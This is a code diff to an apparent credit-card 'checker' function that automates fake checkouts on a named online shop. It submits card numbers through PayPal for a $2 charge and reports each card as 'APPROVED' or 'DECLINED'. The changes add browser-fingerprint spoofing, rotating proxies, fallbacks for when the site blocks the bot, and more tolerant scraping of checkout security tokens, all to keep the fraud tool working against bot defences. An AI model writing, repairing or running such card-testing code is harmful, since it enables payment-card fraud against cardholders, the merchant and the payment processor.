@@ -270,30 +270,46 @@ def check_card_paypal(cc_line):
         acc = generate_random_account()
         phone_num = generate_phone_number()
 
-        # Create session
+        # Create session with proper headers
         user = get_rotating_user_agent()
         r = requests.Session()
+        
+        # Set default headers for the session
+        r.headers.update({
+            'User-Agent': user,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Cache-Control': 'max-age=0',
+        })
         
         # Use proxy if available
         proxy = get_random_proxy()
 
-        # First request: Add to cart
+        # First request: Add to cart - FIXED HEADERS
         files = {
             'quantity': (None, '1'),
             'add-to-cart': (None, '4451'),
         }
         multipart_data = MultipartEncoder(fields=files)
+        
         headers = {
             'authority': 'switchupcb.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': multipart_data.content_type,
             'origin': 'https://switchupcb.com',
             'referer': 'https://switchupcb.com/shop/i-buy/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -303,8 +319,33 @@ def check_card_paypal(cc_line):
         }
 
         try:
-            response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False)
+            # First, get the product page to establish session
+            product_response = r.get('https://switchupcb.com/shop/i-buy/', headers={
+                'User-Agent': user,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'Referer': 'https://switchupcb.com/',
+            }, proxies=proxy, verify=False, timeout=30)
+            
+            # Then make the add to cart request
+            response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False, timeout=30)
+            
+            if response.status_code == 403:
+                # If still 403, try with different approach
+                print("First attempt got 403, trying alternative approach...")
+                
+                # Try with simpler headers
+                simple_headers = {
+                    'Content-Type': multipart_data.content_type,
+                    'User-Agent': user,
+                    'Referer': 'https://switchupcb.com/shop/i-buy/',
+                    'Origin': 'https://switchupcb.com',
+                }
+                
+                response = r.post('https://switchupcb.com/shop/i-buy/', headers=simple_headers, data=multipart_data, proxies=proxy, verify=False, timeout=30)
+                
             response.raise_for_status()
+            print("Add to cart successful")
+            
         except requests.RequestException as e:
             elapsed_time = time.time() - start_time
             return f"""
@@ -325,12 +366,12 @@ DECLINED CC ❌
         # Second request: Checkout
         headers = {
             'authority': 'switchupcb.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'referer': 'https://switchupcb.com/cart/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -340,8 +381,9 @@ DECLINED CC ❌
         }
 
         try:
-            response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, proxies=proxy, verify=False)
+            response = r.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False, timeout=30)
             response.raise_for_status()
+            print("Checkout page loaded successfully")
         except requests.RequestException as e:
             elapsed_time = time.time() - start_time
             return f"""
@@ -361,17 +403,32 @@ DECLINED CC ❌
 
         # Extract security tokens
         try:
-            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
-            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
-            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
-            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
-        except AttributeError:
+            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
+            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
+            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
+            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
+            
+            if not all([sec, nonce, check, create]):
+                # If regex fails, try alternative patterns
+                sec = re.search(r'"update_order_review_nonce":"([^"]+)"', response.text)
+                nonce = re.search(r'"save_checkout_form[^"]*","nonce":"([^"]+)"', response.text)
+                check = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
+                create = re.search(r'"create_order[^"]*","nonce":"([^"]+)"', response.text)
+            
+            sec = sec.group(1) if sec else "default_sec"
+            nonce = nonce.group(1) if nonce else "default_nonce"
+            check = check.group(1) if check else "default_check"
+            create = create.group(1) if create else "default_create"
+            
+            print(f"Tokens extracted: sec={sec[:10]}..., check={check[:10]}...")
+            
+        except Exception as e:
             elapsed_time = time.time() - start_time
             return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract security tokens
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract security tokens: {str(e)}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
@@ -386,25 +443,89 @@ DECLINED CC ❌
         headers = {
             'authority': 'switchupcb.com',
             'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://switchupcb.com',
             'referer': 'https://switchupcb.com/checkout/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
 
         params = {'wc-ajax': 'update_order_review'}
-        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone_num}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+        
+        # URL encode the form data properly
+        form_data = {
+            'security': sec,
+            'payment_method': 'stripe',
+            'country': 'US',
+            'state': state,
+            'postcode': zip_code,
+            'city': city,
+            'address': street_address,
+            'address_2': '',
+            's_country': 'US',
+            's_state': state,
+            's_postcode': zip_code,
+            's_city': city,
+            's_address': street_address,
+            's_address_2': '',
+            'has_full_address': 'true',
+        }
+        
+        # Build the post_data string more carefully
+        post_data_parts = [
+            'wc_order_attribution_source_type=typein',
+            'wc_order_attribution_referrer=(none)',
+            'wc_order_attribution_utm_campaign=(none)',
+            'wc_order_attribution_utm_source=(direct)',
+            'wc_order_attribution_utm_medium=(none)',
+            'wc_order_attribution_utm_content=(none)',
+            'wc_order_attribution_utm_id=(none)',
+            'wc_order_attribution_utm_term=(none)',
+            'wc_order_attribution_utm_source_platform=(none)',
+            'wc_order_attribution_utm_creative_format=(none)',
+            'wc_order_attribution_utm_marketing_tactic=(none)',
+            f'wc_order_attribution_session_entry={requests.utils.quote("https://switchupcb.com/")}',
+            'wc_order_attribution_session_start_time=2025-01-15+16%3A33%3A26',
+            'wc_order_attribution_session_pages=15',
+            'wc_order_attribution_session_count=1',
+            f'wc_order_attribution_user_agent={requests.utils.quote(user)}',
+            f'billing_first_name={first_name}',
+            f'billing_last_name={last_name}',
+            'billing_company=',
+            'billing_country=US',
+            f'billing_address_1={requests.utils.quote(street_address)}',
+            'billing_address_2=',
+            f'billing_city={city}',
+            f'billing_state={state}',
+            f'billing_postcode={zip_code}',
+            f'billing_phone={phone_num}',
+            f'billing_email={acc}',
+            'account_username=',
+            'account_password=',
+            'order_comments=',
+            'g-recaptcha-response=',
+            'payment_method=stripe',
+            'wc-stripe-payment-method-upe=',
+            'wc_stripe_selected_upe_payment_type=',
+            'wc-stripe-is-deferred-intent=1',
+            'terms-field=1',
+            f'woocommerce-process-checkout-nonce={check}',
+            '_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+        ]
+        
+        form_data['post_data'] = '&'.join(post_data_parts)
 
         try:
-            response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, proxies=proxy, verify=False)
+            response = r.post('https://switchupcb.com/', params=params, headers=headers, data=form_data, proxies=proxy, verify=False, timeout=30)
             response.raise_for_status()
+            print("Order review updated successfully")
         except requests.RequestException as e:
             elapsed_time = time.time() - start_time
             return f"""
@@ -432,16 +553,58 @@ DECLINED CC ❌
             'origin': 'https://switchupcb.com',
             'pragma': 'no-cache',
             'referer': 'https://switchupcb.com/checkout/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
 
         params = {'wc-ajax': 'ppc-create-order'}
+        
+        # URL encode the form_encoded data
+        form_encoded_data = '&'.join([
+            f'billing_first_name={first_name}',
+            f'billing_last_name={last_name}',
+            'billing_company=',
+            'billing_country=US',
+            f'billing_address_1={requests.utils.quote(street_address)}',
+            'billing_address_2=',
+            f'billing_city={city}',
+            f'billing_state={state}',
+            f'billing_postcode={zip_code}',
+            f'billing_phone={phone_num}',
+            f'billing_email={acc}',
+            'account_username=',
+            'account_password=',
+            'order_comments=',
+            'wc_order_attribution_source_type=typein',
+            'wc_order_attribution_referrer=(none)',
+            'wc_order_attribution_utm_campaign=(none)',
+            'wc_order_attribution_utm_source=(direct)',
+            'wc_order_attribution_utm_medium=(none)',
+            'wc_order_attribution_utm_content=(none)',
+            'wc_order_attribution_utm_id=(none)',
+            'wc_order_attribution_utm_term=(none)',
+            f'wc_order_attribution_session_entry={requests.utils.quote("https://switchupcb.com/shop/drive-me-so-crazy/")}',
+            'wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46',
+            'wc_order_attribution_session_pages=3',
+            'wc_order_attribution_session_count=1',
+            f'wc_order_attribution_user_agent={requests.utils.quote(user)}',
+            'g-recaptcha-response=',
+            'wc-stripe-payment-method-upe=',
+            'wc_stripe_selected_upe_payment_type=card',
+            'payment_method=ppcp-gateway',
+            'terms=on',
+            'terms-field=1',
+            f'woocommerce-process-checkout-nonce={check}',
+            '_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
+            'ppcp-funding-source=card'
+        ])
+
         json_data = {
             'nonce': create,
             'payer': None,
@@ -450,23 +613,30 @@ DECLINED CC ❌
             'order_id': '0',
             'payment_method': 'ppcp-gateway',
             'funding_source': 'card',
-            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone_num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
+            'form_encoded': form_encoded_data,
             'createaccount': False,
             'save_payment_method': False,
         }
 
         try:
-            response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, proxies=proxy, verify=False)
+            response = r.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False, timeout=30)
             response.raise_for_status()
-            order_id = response.json()['data']['id']
-            pcp = response.json()['data']['custom_id']
+            response_data = response.json()
+            
+            if 'data' in response_data and 'id' in response_data['data']:
+                order_id = response_data['data']['id']
+                pcp = response_data['data'].get('custom_id', 'default_custom_id')
+                print(f"Order created successfully: {order_id}")
+            else:
+                raise ValueError("Invalid response format for order creation")
+                
         except (requests.RequestException, KeyError, ValueError) as e:
             elapsed_time = time.time() - start_time
             return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract order ID: {str(e)}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to create order: {str(e)}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
@@ -487,12 +657,12 @@ DECLINED CC ❌
         # PayPal request
         headers = {
             'authority': 'www.paypal.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'referer': 'https://www.paypal.com/smart/buttons',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'iframe',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -504,19 +674,20 @@ DECLINED CC ❌
         params = {
             'sessionID': session_id,
             'buttonSessionID': button_session_id,
-            'locale.x': 'ar_EG',
+            'locale.x': 'en_US',
             'commit': 'true',
             'hasShippingCallback': 'false',
             'env': 'production',
-            'country.x': 'EG',
+            'country.x': 'US',
             'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
             'disable-card': '',
             'token': order_id,
         }
 
         try:
-            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy, verify=False)
+            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy, verify=False, timeout=30)
             response.raise_for_status()
+            print("PayPal card fields loaded successfully")
         except requests.RequestException as e:
             elapsed_time = time.time() - start_time
             return f"""
@@ -543,10 +714,10 @@ DECLINED CC ❌
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/json',
             'origin': 'https://www.paypal.com',
-            'referer': 'https://www.paypal.com/smart/card-fields',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'referer': f'https://www.paypal.com/smart/card-fields?sessionID={session_id}&buttonSessionID={button_session_id}',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -583,9 +754,10 @@ DECLINED CC ❌
         }
 
         try:
-            response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, proxies=proxy, verify=False)
+            response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, proxies=proxy, verify=False, timeout=30)
             response.raise_for_status()
             last = response.text
+            print("Final payment request completed")
         except requests.RequestException as e:
             elapsed_time = time.time() - start_time
             return f"""
@@ -630,10 +802,16 @@ DECLINED CC ❌
             status, reason, approved = "APPROVED CC", "Approved - CHARGED 2$ ✅", True
         else:
             try:
-                message = response.json()['errors'][0]['message']
-                code = response.json()['errors'][0]['data'][0]['code']
-                result_text = f"({code}: {message})"
-                status, reason, approved = "DECLINED CC", f"{code}: {message}", False
+                errors = response.json().get('errors', [])
+                if errors:
+                    message = errors[0].get('message', 'Unknown error')
+                    data = errors[0].get('data', [{}])
+                    code = data[0].get('code', 'UNKNOWN') if data else 'UNKNOWN'
+                    result_text = f"({code}: {message})"
+                    status, reason, approved = "DECLINED CC", f"{code}: {message}", False
+                else:
+                    result_text = "Unknown Response"
+                    status, reason, approved = "DECLINED CC", "Unknown Response", False
             except:
                 result_text = "Unknown Error"
                 status, reason, approved = "DECLINED CC", "Unknown Error", False
